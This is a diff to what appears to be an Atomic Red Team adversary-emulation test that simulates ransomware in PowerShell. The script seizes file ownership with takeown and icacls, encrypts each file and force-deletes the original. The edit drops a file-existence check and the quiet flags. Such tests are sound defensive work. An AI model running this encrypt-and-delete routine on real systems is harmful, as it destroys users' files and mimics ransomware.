@@ -110,19 +110,13 @@ atomic_tests:
             # Log the current file being processed
             Write-Host "🔍 Processing file: $file"
 
-            # Check if the file exists
-            if (-Not (Test-Path $file)) {
-                Write-Host "❌ ERROR: File not found: $file"
-                return
-            }
-
-            # Take ownership and modify permissions (suppress prompts)
+            # Take ownership and modify permissions
             try {
-                takeown /F $file /A /Q
-                icacls $file /grant Administrators:F /T /C /Q
+                takeown /F $file /A
+                icacls $file /grant Administrators:F /T /C
                 Write-Host "🔑 Permissions modified successfully for: $file"
             } catch {
-                Write-Host "❌ ERROR: Failed to modify permissions for file: $file"
+                Write-Host "❌ Failed to modify permissions for file: $file"
                 return
             }
 
@@ -134,11 +128,11 @@ atomic_tests:
             if ($LASTEXITCODE -eq 0) {
                 Write-Host "✅ Successfully encrypted: $file -> $encryptedFile"
                 
-                # Delete the original file after successful encryption (suppress prompts)
-                Remove-Item -Path $file -Force -Recurse -Confirm:$false
+                # Delete the original file after successful encryption
+                Remove-Item -Path $file -Force
                 Write-Host "🗑️ Deleted original file: $file"
             } else {
-                Write-Host "❌ ERROR: Failed to encrypt: $file"
+                Write-Host "❌ Failed to encrypt: $file"
             }
         }
 
